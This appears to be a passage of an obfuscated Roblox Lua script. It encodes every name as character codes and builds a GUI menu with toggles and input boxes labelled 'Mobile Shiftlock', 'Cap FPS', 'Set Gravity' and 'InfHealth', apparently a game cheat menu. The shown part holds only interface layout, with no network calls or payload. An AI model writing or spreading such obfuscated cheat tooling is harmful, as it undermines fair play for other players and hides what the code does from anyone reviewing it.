_llza[_sc(50,51,101)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,51,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,51,101)][_sc(84,101,120,116)]=[[Mobile Shiftlock]];
_llza[_sc(50,51,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,51,101)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(50,51,101)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,51,101)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(50,51,102)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,51,101)]);
_llza[_sc(50,51,102)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(50,52,48)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,51,101)]);
_llza[_sc(50,52,48)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,52,49)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,51,55)]);
_llza[_sc(50,52,49)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(50,52,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,50,98)]);
_llza[_sc(50,52,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(50,52,50)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,52,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,52,50)][_sc(78,97,109,101)]=[[CapFPS]];
_llza[_sc(50,52,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,52,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,52,50)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,52,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,52,51)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,52,50)]);
_llza[_sc(50,52,51)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(50,52,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,52,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,52,51)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,52,51)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,52,51)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,52,51)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,52,51)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(50,52,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,52,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,52,51)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,52,52)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,52,51)]);
_llza[_sc(50,52,52)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(50,52,52)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(50,52,52)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,52,52)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,52,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,52,51)]);
_llza[_sc(50,52,53)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,52,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,52,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,52,53)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(50,52,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,52,54)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,52,53)]);
_llza[_sc(50,52,54)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,52,54)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,52,55)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,52,53)]);
_llza[_sc(50,52,55)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,52,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,52,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,52,55)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(50,52,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,52,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,52,56)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,52,55)]);
_llza[_sc(50,52,56)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,52,56)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,52,57)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,52,50)]);
_llza[_sc(50,52,57)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,52,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,52,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,52,57)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,52,57)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,52,57)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,52,57)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(50,52,57)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,52,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,52,57)][_sc(84,101,120,116)]=[[Cap FPS]];
_llza[_sc(50,52,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,52,57)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(50,52,57)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,52,57)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(50,52,97)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,52,57)]);
_llza[_sc(50,52,97)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(50,52,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,52,57)]);
_llza[_sc(50,52,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,52,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,52,50)]);
_llza[_sc(50,52,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(50,52,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,52,50)]);
_llza[_sc(50,52,100)][_sc(90,73,110,100,101,120)]=55;
_llza[_sc(50,52,100)][_sc(83,105,122,101)]=UDim2.new(0, 79, 0, 20);
_llza[_sc(50,52,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,52,100)][_sc(78,97,109,101)]=[[CapFPSChanger]];
_llza[_sc(50,52,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,52,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,52,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.54598, 0, 0, 0);
_llza[_sc(50,52,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,52,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,52,100)]);
_llza[_sc(50,52,101)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(50,52,101)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(50,52,101)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,52,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,52,102)]=Instance.new(_sc(84,101,120,116,66,111,120),_llza[_sc(50,52,100)]);
_llza[_sc(50,52,102)][_sc(80,108,97,99,101,104,111,108,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(50,52,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,52,102)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,52,102)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,52,102)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,52,102)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(50,52,102)][_sc(80,108,97,99,101,104,111,108,100,101,114,84,101,120,116)]=[[(60)]];
_llza[_sc(50,52,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,52,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,52,102)][_sc(84,101,120,116)]=[[]];
_llza[_sc(50,52,102)][_sc(78,97,109,101)]=[[textbox]];
_llza[_sc(50,53,48)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,52,102)]);
_llza[_sc(50,53,48)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,53,48)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,53,48)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(50,53,49)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,52,102)]);
_llza[_sc(50,53,49)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,53,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,53,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,53,49)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(50,53,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,53,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,53,50)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,53,49)]);
_llza[_sc(50,53,50)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,53,50)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,53,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,52,102)]);
_llza[_sc(50,53,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,53,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,50,98)]);
_llza[_sc(50,53,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(50,53,52)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,53,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,53,52)][_sc(78,97,109,101)]=[[SetGravity]];
_llza[_sc(50,53,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,53,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,53,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,53,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,53,53)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,53,52)]);
_llza[_sc(50,53,53)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(50,53,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,53,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,53,53)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,53,53)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,53,53)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,53,53)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,53,53)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(50,53,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,53,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,53,53)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,53,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,53,53)]);
_llza[_sc(50,53,54)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(50,53,54)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(50,53,54)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,53,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,53,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,53,53)]);
_llza[_sc(50,53,55)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,53,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,53,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,53,55)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(50,53,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,53,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,53,55)]);
_llza[_sc(50,53,56)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,53,56)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,53,57)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,53,55)]);
_llza[_sc(50,53,57)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,53,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,53,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,53,57)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(50,53,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,53,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,53,97)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,53,57)]);
_llza[_sc(50,53,97)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,53,97)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,53,98)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,53,52)]);
_llza[_sc(50,53,98)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,53,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,53,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,53,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,53,98)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,53,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,53,98)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(50,53,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,53,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,53,98)][_sc(84,101,120,116)]=[[Set Gravity]];
_llza[_sc(50,53,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,53,98)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(50,53,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,53,98)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(50,53,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,53,98)]);
_llza[_sc(50,53,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(50,53,100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,53,98)]);
_llza[_sc(50,53,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,53,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,53,52)]);
_llza[_sc(50,53,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(50,53,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,53,52)]);
_llza[_sc(50,53,102)][_sc(90,73,110,100,101,120)]=55;
_llza[_sc(50,53,102)][_sc(83,105,122,101)]=UDim2.new(0, 70, 0, 20);
_llza[_sc(50,53,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,53,102)][_sc(78,97,109,101)]=[[GravityChanger]];
_llza[_sc(50,53,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,53,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,53,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -70, 0, 0);
_llza[_sc(50,53,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,54,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,53,102)]);
_llza[_sc(50,54,48)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(50,54,48)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(50,54,48)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,54,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,54,49)]=Instance.new(_sc(84,101,120,116,66,111,120),_llza[_sc(50,53,102)]);
_llza[_sc(50,54,49)][_sc(80,108,97,99,101,104,111,108,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(50,54,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,54,49)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,54,49)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,54,49)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,54,49)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(50,54,49)][_sc(80,108,97,99,101,104,111,108,100,101,114,84,101,120,116)]=[[(196.2)]];
_llza[_sc(50,54,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,54,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,54,49)][_sc(84,101,120,116)]=[[]];
_llza[_sc(50,54,49)][_sc(78,97,109,101)]=[[textbox]];
_llza[_sc(50,54,50)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,54,49)]);
_llza[_sc(50,54,50)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,54,50)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,54,50)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(50,54,51)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,54,49)]);
_llza[_sc(50,54,51)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,54,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,54,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,54,51)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(50,54,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,54,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,54,52)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,54,51)]);
_llza[_sc(50,54,52)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,54,52)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,54,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,54,49)]);
_llza[_sc(50,54,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,54,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,50,98)]);
_llza[_sc(50,54,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(50,54,54)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,54,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,54,54)][_sc(78,97,109,101)]=[[InfHealth]];
_llza[_sc(50,54,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,54,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,54,54)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,54,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,54,55)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,54,54)]);
_llza[_sc(50,54,55)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(50,54,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,54,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,54,55)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,54,55)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,54,55)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,54,55)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,54,55)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(50,54,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,54,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,54,55)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,54,56)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,54,55)]);
_llza[_sc(50,54,56)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(50,54,56)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(50,54,56)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,54,56)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,54,57)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,54,55)]);
_llza[_sc(50,54,57)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,54,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,54,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,54,57)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(50,54,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,54,97)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,54,57)]);
_llza[_sc(50,54,97)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,54,97)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,54,98)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,54,57)]);
